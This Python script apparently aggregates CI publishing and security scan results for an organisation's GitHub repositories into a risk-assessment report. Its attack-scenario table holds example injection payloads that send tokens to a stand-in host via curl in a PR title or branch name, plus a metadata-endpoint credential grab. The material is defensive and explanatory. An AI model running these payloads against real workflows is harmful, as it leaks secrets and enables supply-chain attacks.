from agent_factory.remote_mcp_client import RemoteMCPClient
from services.llm_service import call_llm
import httpx
import re

async def run(input_dict, tools):
    mcpc = { url : RemoteMCPClient(remote_url = url) for url in tools.keys() }
    http_client = httpx.AsyncClient()
    try:
        github_owner = input_dict.get("github_owner", "apache")
        redacted_severity = input_dict.get("redacted_severity", "").strip().upper()
        print(f"Review starting for github_owner={github_owner}" +
              (f" (redacting {redacted_severity})" if redacted_severity else ""), flush=True)

        report_ns = data_store.use_namespace(f"ci-report:{github_owner}")
        security_ns = data_store.use_namespace(f"ci-security:{github_owner}")

        pub_stats = report_ns.get("latest_stats")
        sec_stats = security_ns.get("latest_stats")
        pub_report = report_ns.get("latest_report")
        sec_report = security_ns.get("latest_report")

        if not pub_stats or not sec_stats:
            return {"outputText": "Error: Run Agent 1 and Agent 2 first."}

        print(f"Publishing report: {len(pub_report or '')} chars", flush=True)
        print(f"Security report: {len(sec_report or '')} chars", flush=True)

        # --- Parse per-repo ecosystems from publishing report text ---
        repo_ecosystems = {}
        repo_categories = {}
        if pub_report:
            header_pattern = re.compile(
                r'### ' + re.escape(f'{github_owner}/') + r'(\S+)\s*\n+'
                r'\*\*(\d+)\*\* release/snapshot workflows \| Ecosystems: \*\*([^*]+)\*\*'
                r' \|(.+)')
            for m in header_pattern.finditer(pub_report):
                repo = m.group(1)
                ecosystems = [e.strip() for e in m.group(3).split(",")]
                repo_ecosystems[repo] = ecosystems
                cats_str = m.group(4)
                cats = {}
                for cat_m in re.finditer(r'(Release Artifacts|Snapshot[^:]*): (\d+)', cats_str):
                    if "Release" in cat_m.group(1):
                        cats["release"] = int(cat_m.group(2))
                    else:
                        cats["snapshot"] = int(cat_m.group(2))
                repo_categories[repo] = cats

        print(f"Parsed ecosystems for {len(repo_ecosystems)} repos", flush=True)

        # --- Read per-repo security findings ---
        all_sec_keys = security_ns.list_keys()
        finding_keys = [k for k in all_sec_keys if k.startswith("findings:")]

        repo_security = {}

        for k in finding_keys:
            repo = k.replace("findings:", "")
            findings = security_ns.get(k)
            if not findings or not isinstance(findings, list):
                continue

            if redacted_severity:
                findings = [f for f in findings if f.get("severity", "INFO") != redacted_severity]
                if not findings:
                    continue

            sev_counts = {}
            check_counts = {}
            for f in findings:
                sev = f.get("severity", "INFO")
                sev_counts[sev] = sev_counts.get(sev, 0) + 1
                chk = f.get("check", "unknown")
                if sev != "INFO":
                    check_counts[chk] = check_counts.get(chk, 0) + 1

            worst = "INFO"
            for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
                if sev_counts.get(s, 0) > 0:
                    worst = s
                    break

            top_checks = sorted(check_counts.items(), key=lambda x: -x[1])[:3]

            repo_security[repo] = {
                "severities": sev_counts,
                "total": len(findings),
                "worst": worst,
                "top_checks": top_checks,
            }

        print(f"Security data for {len(repo_security)} repos", flush=True)

        # --- Parse trusted publishing opportunities ---
        tp_repos = set()
        tp_opportunities = pub_stats.get("trusted_publishing_opportunities", [])
        if isinstance(tp_opportunities, list):
            for opp in tp_opportunities:
                if isinstance(opp, dict):
                    tp_repos.add(opp.get("repo", ""))
                elif isinstance(opp, str):
                    tp_repos.add(opp)
        if pub_report:
            tp_section = False
            for line in pub_report.split("\n"):
                if "Trusted Publishing Migration" in line:
                    tp_section = True
                    continue
                if tp_section and line.startswith("## ") and "Trusted" not in line:
                    break
                if tp_section and "| " in line and "`" in line:
                    parts = line.split("|")
                    if len(parts) > 1:
                        repo_name = parts[1].strip()
                        if repo_name and repo_name != "Repository":
                            tp_repos.add(repo_name)

        print(f"Trusted publishing opportunity repos: {len(tp_repos)}", flush=True)

        # --- Build combined risk table ---
        publishing_repos = set(pub_stats.get("publishing_repos", []))
        all_repos = publishing_repos | set(repo_security.keys())

        repo_rows = []
        for repo in sorted(all_repos):
            ecosystems = repo_ecosystems.get(repo, [])
            sec = repo_security.get(repo, {})
            worst = sec.get("worst", "—")
            total = sec.get("total", 0)
            sev_counts = sec.get("severities", {})
            top_checks = sec.get("top_checks", [])
            cats = repo_categories.get(repo, {})
            publishes = repo in publishing_repos
            has_tp_opportunity = repo in tp_repos

            eco_score = len(ecosystems) if ecosystems else (1 if publishes else 0)
            sev_score = {"CRITICAL": 100, "HIGH": 50, "MEDIUM": 10, "LOW": 3, "INFO": 1, "—": 0}.get(worst, 0)
            risk_score = eco_score * sev_score + total

            repo_rows.append({
                "repo": repo,
                "ecosystems": ecosystems,
                "publishes": publishes,
                "worst": worst,
                "total": total,
                "sev_counts": sev_counts,
                "top_checks": top_checks,
                "cats": cats,
                "has_tp": has_tp_opportunity,
                "risk_score": risk_score,
            })

        repo_rows.sort(key=lambda r: -r["risk_score"])

        # --- Classify into tiers ---
        critical_repos = [r for r in repo_rows if r["worst"] == "CRITICAL"]
        high_repos = [r for r in repo_rows if r["worst"] == "HIGH"]
        high_publishing = [r for r in high_repos if r["publishes"]]
        high_nonpublishing = [r for r in high_repos if not r["publishes"]]
        medium_repos = [r for r in repo_rows if r["worst"] == "MEDIUM" and r["publishes"]]
        low_repos = [r for r in repo_rows if r["worst"] in ("LOW", "INFO", "—") and r["publishes"]]

        # --- Generate report ---
        PUB = "apache-github-publishing.md"
        SEC = "apache-github-security.md"

        def anchor(text):
            a = text.lower().strip()
            a = re.sub(r'[^\w\s-]', '', a)
            a = re.sub(r'\s+', '-', a)
            a = re.sub(r'-+', '-', a)
            return a.strip('-')

        def repo_pub_link(repo):
            return f"[publishing]({PUB}#{anchor(f'{github_owner}/{repo}')})"

        def repo_sec_link(repo):
            return f"[security]({SEC}#{anchor(f'{github_owner}/{repo}')})"

        def eco_str(ecosystems):
            if not ecosystems:
                return "—"
            return ", ".join(ecosystems)

        def sev_summary(sev_counts):
            parts = []
            for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
                c = sev_counts.get(s, 0)
                if c > 0:
                    parts.append(f"{c} {s}")
            return ", ".join(parts) if parts else "INFO only"

        def check_summary(top_checks):
            if not top_checks:
                return ""
            return ", ".join(f"{chk} ({n})" for chk, n in top_checks)

        def plural(n, singular, plural_form=None):
            if plural_form is None:
                plural_form = singular + "s"
            return singular if n == 1 else plural_form

        lines = []
        lines.append(f"# Apache GitHub Review: Combined Risk Assessment\n")
        lines.append(f"Cross-referencing CI publishing analysis with security scan results "
                     f"across **{len(all_repos)}** repositories.\n")

        lines.append("## Companion Reports\n")
        lines.append(f"| Report | Description |")
        lines.append(f"|--------|-------------|")
        lines.append(f"| [{PUB}]({PUB}) | Which repos publish packages to registries, "
                     f"what ecosystems, auth methods, trusted publishing opportunities. "
                     f"{pub_stats.get('total_workflows', '?')} workflows across "
                     f"{pub_stats.get('repos_scanned', '?')} repos. |")
        lines.append(f"| [{SEC}]({SEC}) | Pattern-matching security checks on cached workflow YAML: "
                     f"injection patterns, unpinned actions, permissions, composite action analysis. "
                     f"{sec_stats.get('total_findings', '?')} findings across "
                     f"{sec_stats.get('repos_with_findings', '?')} repos. |")
        lines.append("")

        # --- At a glance ---
        lines.append("## At a Glance\n")
        lines.append(f"| Metric | Value |")
        lines.append(f"|--------|-------|")
        lines.append(f"| Repos scanned | {pub_stats.get('repos_scanned', '?')} |")
        lines.append(f"| Repos publishing to registries | {len(publishing_repos)} |")
        lines.append(f"| Total security findings | {sec_stats.get('total_findings', '?')} |")
        sev = sec_stats.get("severity_counts", {})
        if sev.get("CRITICAL", 0):
            lines.append(f"| CRITICAL findings | {sev.get('CRITICAL', 0)} |")
        if sev.get("HIGH", 0):
            lines.append(f"| HIGH findings | {sev.get('HIGH', 0)} |")
        if tp_repos:
            lines.append(f"| Repos needing trusted publishing migration | {len(tp_repos)} |")
        eco = pub_stats.get("ecosystem_counts", {})
        doc_targets = {"codecov", "github_pages", "surge_sh", "s3", "gcr", "ghcr"}
        release_eco = {k: v for k, v in eco.items() if k not in doc_targets}
        top_eco = sorted(release_eco.items(), key=lambda x: -x[1])[:5]
        eco_summary = ", ".join(f"{e} ({c})" for e, c in top_eco) if top_eco else "none"
        lines.append(f"| Top ecosystems | {eco_summary} |")
        lines.append("")

        # --- Findings by Vulnerability Type ---
        check_counts = sec_stats.get("check_counts", {})
        # Filter out informational-only checks
        info_checks = {"composite_actions_scanned"}
        vuln_checks = {k: v for k, v in check_counts.items() if k not in info_checks and v > 0}

        ATTACK_SCENARIOS = {
            "prt_checkout": {
                "label": "PR Target Code Execution",
                "severity": "CRITICAL–LOW",
                "description": "Workflow uses `pull_request_target` and checks out PR head code. Severity depends on permissions and trigger type.",
                "attack": ("An external contributor opens a PR that modifies a script executed by the workflow. "
                           "Because `pull_request_target` runs with the *base* repo's secrets, "
                           "the attacker's code can access repository secrets and GITHUB_TOKEN permissions. "
                           "Severity is modulated by two factors: "
                           "(1) **Permissions** — if the workflow only has `pull-requests: write` and no "
                           "`contents: write` or `id-token: write`, blast radius is limited. "
                           "(2) **Event types** — if the trigger is restricted to `labeled` or `assigned`, "
                           "a maintainer must explicitly trigger the workflow. "
                           "CRITICAL = PR head checkout + broad permissions + auto-trigger. "
                           "MEDIUM = one mitigating factor. LOW = both mitigating factors."),
                "example": ("1. Attacker forks the repo\n"
                            "2. Modifies `build.sh` to exfiltrate `$NPM_TOKEN` to an external server\n"
                            "3. Opens PR — workflow checks out attacker's branch via `ref: ${{ github.event.pull_request.head.sha }}`\n"
                            "4. If permissions are broad: secrets are leaked; attacker publishes backdoored package\n"
                            "5. If permissions are limited (e.g., pull-requests: write only): attacker can modify PRs but not publish"),
            },
            "composite_action_input_injection": {
                "label": "Composite Action Latent Injection",
                "severity": "MEDIUM",
                "description": "Composite action interpolates `inputs.*` directly in `run:` blocks.",
                "attack": ("The composite action interpolates `inputs.*` in shell `run:` blocks. This is **not exploitable** "
                           "as long as every calling workflow passes only trusted values (hardcoded strings, "
                           "workflow_dispatch inputs from committers, GitHub-controlled values). However, if a future "
                           "workflow passes attacker-controlled input (PR title, branch name, comment body) to the "
                           "composite action, the interpolation becomes a shell injection vector. This is a latent "
                           "risk — the injection surface exists but requires an unsafe caller to become exploitable."),
                "example": ("1. Composite action has: `run: echo \"Building ${{ inputs.version }}\"`\n"
                            "2. Today: called with `version: \"1.2.3\"` from workflow_dispatch (safe)\n"
                            "3. Future PR adds: `version: ${{ github.event.pull_request.title }}` (unsafe)\n"
                            "4. Now attacker sets PR title to: `\"; curl http://evil.com/steal?t=$NPM_TOKEN #`"),
            },
            "run_block_injection": {
                "label": "Workflow Script Injection",
                "severity": "LOW–MEDIUM",
                "description": "Direct `${{ }}` interpolation of values in workflow `run:` blocks.",
                "attack": ("When untrusted values (PR titles, branch names, issue bodies) are interpolated directly "
                           "into shell scripts via `${{ }}`, an attacker can inject arbitrary shell commands. "
                           "Even trusted values like `secrets.*` or `workflow_dispatch` inputs risk log leakage "
                           "or accidental command injection from malformed input."),
                "example": ("1. Workflow has: `run: echo \"Branch: ${{ github.head_ref }}\"`\n"
                            "2. Attacker creates branch named: `main\"; curl http://evil.com/steal?t=$SECRET #`\n"
                            "3. Shell interprets the branch name as a command\n"
                            "4. Fix: pass through `env:` block and reference as `$BRANCH`"),
            },
            "unpinned_actions": {
                "label": "Unpinned Action Tags",
                "severity": "MEDIUM",
                "description": "Third-party actions (outside `actions/*`, `github/*`, `apache/*`) referenced by mutable version tags instead of SHA-pinned commits.",
                "attack": ("An attacker compromises an action's repository (or a maintainer account) and pushes "
                           "malicious code to an existing tag. Every workflow referencing that tag "
                           "immediately runs the compromised code. This happened in the real-world `tj-actions/changed-files` "
                           "supply chain attack (March 2025)."),
                "example": ("1. Workflow uses `cool-org/deploy-action@v2` (mutable tag, outside actions/*/github/*/apache/*)\n"
                            "2. Attacker compromises the action repo and force-pushes to the `v2` tag\n"
                            "3. Next workflow run executes attacker's code with full repo access\n"
                            "4. Fix: pin to SHA — `cool-org/deploy-action@8843d7f92416211de9eb`"),
            },
            "composite_action_unpinned": {
                "label": "Unpinned Actions in Composite Actions",
                "severity": "MEDIUM",
                "description": "Composite actions reference third-party actions (outside `actions/*`, `github/*`, `apache/*`) by mutable tags.",
                "attack": ("Same supply chain risk as unpinned workflow actions, but harder to audit. "
                           "Reviewers checking `.github/workflows/` won't see the unpinned refs buried "
                           "inside `.github/actions/*/action.yml`. A compromised dependency action affects "
                           "all workflows that call the composite action."),
                "example": ("1. Composite action `.github/actions/build/action.yml` uses `cool-org/cache-action@v4`\n"
                            "2. 15 workflows call this composite action\n"
                            "3. `cool-org/cache-action@v4` tag is compromised\n"
                            "4. All 15 workflows are now executing malicious code"),
            },
            "composite_action_injection": {
                "label": "Composite Action Input Interpolation",
                "severity": "LOW",
                "description": "Composite action interpolates inputs in `run:` blocks (trusted callers today).",
                "attack": ("Currently called only from trusted contexts (workflow_dispatch, push to main), "
                           "but if a future workflow passes untrusted input (PR title, comment body) to this "
                           "composite action, the interpolation becomes exploitable. The injection surface "
                           "is pre-positioned — it just needs an unsafe caller."),
                "example": ("1. Composite action has: `run: ./build.sh --version=${{ inputs.version }}`\n"
                            "2. Today, only called from workflow_dispatch (committers only) — safe\n"
                            "3. Future PR adds: `version: ${{ github.event.pull_request.head.ref }}`\n"
                            "4. Now attacker-controlled input flows into shell execution"),
            },
            "broad_permissions": {
                "label": "Overly Broad Token Permissions",
                "severity": "LOW",
                "description": "Workflow requests more GITHUB_TOKEN scopes than needed.",
                "attack": ("A workflow with `contents: write`, `issues: write`, and `pull-requests: write` "
                           "gives any compromised step (via unpinned action or injection) the ability to "
                           "push code, close issues, merge PRs, and modify releases. Least-privilege would "
                           "limit blast radius."),
                "example": ("1. Workflow has `permissions: { contents: write, issues: write }`\n"
                            "2. A third-party action in the workflow is compromised\n"
                            "3. Compromised action uses GITHUB_TOKEN to push a backdoor commit\n"
                            "4. Fix: restrict to only needed scopes per job"),
            },
            "cache_poisoning": {
                "label": "Cache Poisoning via PR",
                "severity": "INFO",
                "description": "Workflow uses `actions/cache` with pull_request trigger.",
                "attack": ("An attacker's PR can populate the GitHub Actions cache with malicious build "
                           "artifacts or dependencies. If the cache key is predictable (e.g., based on "
                           "`hashFiles('**/package-lock.json')`), subsequent runs on the main branch "
                           "may restore the poisoned cache."),
                "example": ("1. Workflow caches `node_modules` on PR events\n"
                            "2. Attacker's PR modifies `package-lock.json` to add a malicious package\n"
                            "3. Cache is populated with attacker's dependencies\n"
                            "4. Next main-branch build restores the poisoned cache"),
            },
            "missing_codeowners": {
                "label": "No CODEOWNERS File",
                "severity": "LOW",
                "description": "Repository has no CODEOWNERS file for workflow change review.",
                "attack": ("Without CODEOWNERS requiring security team review of `.github/` changes, "
                           "any committer can modify workflow files, add new triggers, weaken permissions, "
                           "or introduce injection patterns without mandatory security review."),
                "example": ("1. Committer adds `pull_request_target` trigger to an existing workflow\n"
                            "2. No CODEOWNERS rule requires security review for `.github/` changes\n"
                            "3. PR is merged with standard code review (reviewer may miss security implication)\n"
                            "4. Workflow is now vulnerable to external PRs"),
            },
            "codeowners_gap": {
                "label": "CODEOWNERS Missing .github/ Coverage",
                "severity": "LOW",
                "description": "CODEOWNERS exists but has no rule covering `.github/` directory.",
                "attack": ("Same risk as missing CODEOWNERS but more subtle — the repo has CODEOWNERS for source "
                           "code but forgot to add `.github/` coverage. Security team reviews code changes "
                           "but workflow modifications slip through."),
                "example": ("1. CODEOWNERS has: `*.java @security-team` but no `.github/` rule\n"
                            "2. Committer modifies `.github/workflows/release.yml`\n"
                            "3. Change bypasses security team review\n"
                            "4. Fix: add `/.github/ @security-team` to CODEOWNERS"),
            },
            "third_party_actions": {
                "label": "Third-Party Actions",
                "severity": "INFO",
                "description": "Workflow uses actions from outside the `actions/*`, `github/*`, and `apache/*` namespaces.",
                "attack": ("Third-party actions run with full access to the workflow's GITHUB_TOKEN and secrets. "
                           "A compromised maintainer account, repo transfer, or typosquat can turn a "
                           "trusted action into a supply chain attack vector."),
                "example": ("1. Workflow uses `cool-org/deploy-action@v2`\n"
                            "2. `cool-org` maintainer's GitHub account is compromised\n"
                            "3. Attacker pushes malicious code to the `v2` tag\n"
                            "4. Every repo using this action now leaks secrets on next run"),
            },
            "self_hosted_runner": {
                "label": "Self-Hosted Runner Exposure",
                "severity": "HIGH–LOW",
                "description": "Workflow runs on self-hosted runners with PR triggers. Severity depends on permissions and trigger type.",
                "attack": ("Self-hosted runners persist state between jobs. An attacker's PR can execute "
                           "arbitrary code on the runner, install backdoors, steal credentials cached on disk, "
                           "or pivot to internal networks the runner has access to."),
                "example": ("1. Workflow runs on `self-hosted` runner and triggers on `pull_request`\n"
                            "2. Attacker's PR executes: `curl http://169.254.169.254/latest/meta-data/`\n"
                            "3. AWS instance credentials are exfiltrated\n"
                            "4. Attacker gains access to internal infrastructure"),
            },
            "missing_dependency_updates": {
                "label": "No Automated Dependency Updates",
                "severity": "LOW",
                "description": "No dependabot.yml or renovate.json. ASF policy requires automated dependency management.",
                "attack": ("Without automated dependency updates, vulnerable transitive dependencies and "
                           "SHA-pinned actions persist indefinitely. Security fixes are not surfaced as PRs."),
                "example": ("1. Repository uses `actions/checkout@abc123` (pinned to SHA)\n"
                            "2. A security vulnerability is found in that version\n"
                            "3. No Dependabot or Renovate config to create update PRs\n"
                            "4. Vulnerable action version persists until manually updated"),
            },
        }

        if vuln_checks:
            lines.append("## Findings by Vulnerability Type\n")
            lines.append("| Vulnerability | Count | Severity | Description |")
            lines.append("|--------------|-------|----------|-------------|")

            for check, count in sorted(vuln_checks.items(), key=lambda x: -x[1]):
                scenario = ATTACK_SCENARIOS.get(check, {})
                label = scenario.get("label", check)
                sev_label = scenario.get("severity", "—")
                desc = scenario.get("description", "")
                lines.append(f"| [{label}](#{anchor(label)}) | {count} | {sev_label} | {desc} |")

            lines.append("")

            # --- Attack Scenario Details ---
            lines.append("## Attack Scenarios\n")
            lines.append("For each vulnerability type found, here is how an attacker could exploit it.\n")

            for check, count in sorted(vuln_checks.items(), key=lambda x: -x[1]):
                scenario = ATTACK_SCENARIOS.get(check)
                if not scenario:
                    continue
                label = scenario["label"]
                lines.append(f"### {label}\n")
                lines.append(f"**{count} instances found** | Severity: **{scenario['severity']}**\n")
                lines.append(f"{scenario['attack']}\n")
                lines.append(f"**Example attack:**\n")
                for step in scenario["example"].split("\n"):
                    lines.append(step)
                lines.append("")

        # --- CRITICAL + HIGH publishing tier ---
        immediate = critical_repos + high_publishing
        if immediate:
            lines.append("## Immediate Attention Required\n")
            lines.append("Repos with CRITICAL or HIGH security findings that also publish packages.\n")

            for r in immediate:
                repo = r["repo"]
                lines.append(f"### {github_owner}/{repo}\n")

                eco_display = eco_str(r["ecosystems"])
                cat_parts = []
                if r["cats"].get("release"):
                    cat_parts.append(f"{r['cats']['release']} release")
                if r["cats"].get("snapshot"):
                    cat_parts.append(f"{r['cats']['snapshot']} snapshot")
                cat_display = ", ".join(cat_parts) if cat_parts else ""

                details = []
                if r["publishes"] and r["ecosystems"]:
                    pub_line = f"**Publishes to:** {eco_display}"
                    if cat_display:
                        pub_line += f" ({cat_display})"
                    details.append(pub_line)
                elif r["publishes"]:
                    details.append(f"**Publishes:** yes (see {repo_pub_link(repo)})")

                details.append(f"**Security:** {r['total']} findings — {sev_summary(r['sev_counts'])}")

                if r["top_checks"]:
                    details.append(f"**Top issues:** {check_summary(r['top_checks'])}")

                if r["has_tp"]:
                    details.append(f"**Trusted publishing:** migration opportunity — currently using long-lived tokens "
                                   f"([details]({PUB}#trusted-publishing-migration-opportunities))")

                details.append(f"**Details:** {repo_pub_link(repo)} · {repo_sec_link(repo)}")

                lines.append("  \n".join(details))
                lines.append("")

        # --- HIGH non-publishing repos ---
        if high_nonpublishing:
            lines.append("## Non-Publishing Repos with HIGH Findings\n")
            lines.append("These repos do not publish packages but have HIGH-severity security findings "
                         "in their CI workflows.\n")

            for r in high_nonpublishing:
                repo = r["repo"]
                lines.append(f"### {github_owner}/{repo}\n")

                details = []
                details.append(f"**Security:** {r['total']} findings — {sev_summary(r['sev_counts'])}")

                if r["top_checks"]:
                    details.append(f"**Top issues:** {check_summary(r['top_checks'])}")

                details.append(f"**Details:** {repo_sec_link(repo)}")

                lines.append("  \n".join(details))
                lines.append("")

        # --- MEDIUM tier: publishing repos ---
        if medium_repos:
            lines.append("## Moderate Risk: Publishing Repos with MEDIUM Findings\n")
            lines.append("These repos publish packages and have MEDIUM-severity findings (typically unpinned actions).\n")
            lines.append(f"| Repo | Ecosystems | Findings | Top Issue | Trusted Pub | Details |")
            lines.append(f"|------|-----------|----------|-----------|------------|---------|")

            for r in medium_repos:
                repo = r["repo"]
                eco = eco_str(r["ecosystems"]) if r["ecosystems"] else "—"
                top = r["top_checks"][0][0] if r["top_checks"] else "unpinned_actions"
                tp = "migrate" if r["has_tp"] else "—"
                links = f"{repo_pub_link(repo)} · {repo_sec_link(repo)}"
                lines.append(f"| {github_owner}/{repo} | {eco} | {r['total']} | {top} | {tp} | {links} |")

            lines.append("")

        # --- LOW tier summary ---
        if low_repos:
            n_low = len(low_repos)
            lines.append("## Low Risk: Publishing Repos\n")
            lines.append(f"{n_low} {plural(n_low, 'repo')} {plural(n_low, 'publishes', 'publish')} packages with only LOW/INFO-level "
                         f"security findings (missing CODEOWNERS, no dependabot config).\n")
            lines.append(f"<details>\n<summary>Show {n_low} {plural(n_low, 'repo')}</summary>\n")
            for r in low_repos:
                repo = r["repo"]
                eco = eco_str(r["ecosystems"]) if r["ecosystems"] else "—"
                lines.append(f"- **{github_owner}/{repo}** — {eco} — {r['total']} findings "
                             f"({repo_pub_link(repo)} · {repo_sec_link(repo)})")
            lines.append(f"\n</details>\n")

        # --- Trusted Publishing summary (skip if none) ---
        if tp_repos:
            n_tp = len(tp_repos)
            lines.append("## Trusted Publishing Opportunities\n")
            lines.append(f"**{n_tp}** {plural(n_tp, 'repo')} {plural(n_tp, 'uses', 'use')} long-lived tokens to publish to ecosystems "
                         f"that support OIDC trusted publishing. Migrating eliminates stored secrets.\n")
            lines.append(f"Full details: [{PUB} → Trusted Publishing]"
                         f"({PUB}#trusted-publishing-migration-opportunities)\n")

            tp_ecosystems = {}
            if pub_report:
                current_eco = None
                for line in pub_report.split("\n"):
                    if line.startswith("### ") and "Trusted Publishing" not in line:
                        eco_name = line[4:].strip()
                        if eco_name in ("crates.io", "npm", "NuGet", "PyPI", "RubyGems"):
                            current_eco = eco_name
                            continue
                    if current_eco and line.startswith("## "):
                        current_eco = None
                        continue
                    if current_eco and "| " in line and "`" in line:
                        parts = [p.strip() for p in line.split("|")]
                        if len(parts) > 2 and parts[1] and parts[1] != "Repository":
                            tp_ecosystems.setdefault(current_eco, []).append(parts[1])

            for eco, repos in sorted(tp_ecosystems.items()):
                unique = sorted(set(repos))
                lines.append(f"- **{eco}**: {', '.join(unique)}")
            lines.append("")

        # --- Summary when nothing in the intersection ---
        if not publishing_repos:
            lines.append("## Summary\n")
            lines.append(f"None of the {pub_stats.get('repos_scanned', '?')} scanned repos publish packages to "
                         f"registries. Security findings are limited to general CI hygiene "
                         f"(unpinned actions, missing CODEOWNERS). See the "
                         f"[security report]({SEC}) for details.\n")

        # --- Key recommendations (only include items with nonzero counts) ---
        lines.append("## Key Recommendations\n")

        rec_num = 1

        if critical_repos:
            crit_names = ", ".join("`" + r["repo"] + "`" for r in critical_repos)
            verb = "has" if len(critical_repos) == 1 else "have"
            lines.append(f"{rec_num}. **Fix CRITICAL findings immediately.** "
                         f"{crit_names} {verb} exploitable CI vulnerabilities "
                         f"([details]({SEC})).")
            rec_num += 1

        if tp_repos:
            n_tp = len(tp_repos)
            lines.append(f"{rec_num}. **Migrate to trusted publishing.** "
                         f"{n_tp} {plural(n_tp, 'repo')} can eliminate long-lived secrets by adopting OIDC. "
                         f"Start with repos publishing to PyPI and npm — "
                         f"[migration guide]({PUB}#trusted-publishing-migration-opportunities).")
            rec_num += 1

        if high_repos:
            repos_with_high = [r for r in repo_rows
                               if r["sev_counts"].get("HIGH", 0) > 0]
            n_high = len(repos_with_high)
            lines.append(f"{rec_num}. **Review HIGH-severity findings.** "
                         f"{n_high} {plural(n_high, 'repo')} {plural(n_high, 'has', 'have')} "
                         f"HIGH findings that need investigation "
                         f"([details]({SEC}#high-findings)).")
            rec_num += 1

        # Composite action injection — now MEDIUM, separate recommendation
        repos_with_ca_injection = [r for r in repo_rows
                                   if r.get("sev_counts", {}).get("MEDIUM", 0) > 0
                                   and any("composite_action" in c for c, _ in r.get("top_checks", []))]
        if repos_with_ca_injection:
            n_ca = len(repos_with_ca_injection)
            lines.append(f"{rec_num}. **Audit composite action callers.** "
                         f"{n_ca} {plural(n_ca, 'repo')} {plural(n_ca, 'has', 'have')} "
                         f"composite actions that interpolate `inputs.*` in shell blocks. "
                         f"Not exploitable today if callers pass trusted values only — "
                         f"verify no workflow passes PR titles, branch names, or comment bodies.")
            rec_num += 1

        repos_with_findings = sec_stats.get("repos_with_findings", 0)
        if repos_with_findings:
            n_repos = repos_with_findings
            lines.append(f"{rec_num}. **Pin actions to SHA hashes.** "
                         f"{'The scanned repo uses' if n_repos == 1 else f'All {n_repos} repos use'} "
                         f"mutable tag refs. "
                         f"See the [unpinned actions findings]({SEC}#medium-findings) for per-repo counts.")
            rec_num += 1

        codeowners_missing = sec_stats.get("check_counts", {}).get("missing_codeowners", 0)
        codeowners_gap = sec_stats.get("check_counts", {}).get("codeowners_gap", 0)
        if codeowners_missing or codeowners_gap:
            parts = []
            if codeowners_missing:
                parts.append(f"{codeowners_missing} {plural(codeowners_missing, 'repo')} "
                             f"{plural(codeowners_missing, 'has', 'have')} no CODEOWNERS file")
            if codeowners_gap:
                parts.append(f"{codeowners_gap} {plural(codeowners_gap, 'has', 'have')} CODEOWNERS "
                             f"without `.github/` rules")
            lines.append(f"{rec_num}. **Add CODEOWNERS with `.github/` coverage.** "
                         f"{' and '.join(parts)}. Workflow changes can bypass security review.")
        lines.append("")

        lines.append("---\n")
        lines.append(f"*Generated from [{PUB}]({PUB}) and [{SEC}]({SEC}).*")

        full_report = "\n".join(lines)
        print(f"Report length: {len(full_report)} chars", flush=True)

        if not redacted_severity:
            combined_ns = data_store.use_namespace(f"ci-combined:{github_owner}")
            combined_ns.set("latest_report", full_report)

        return {"outputText": full_report}

    finally:
        await http_client.aclose()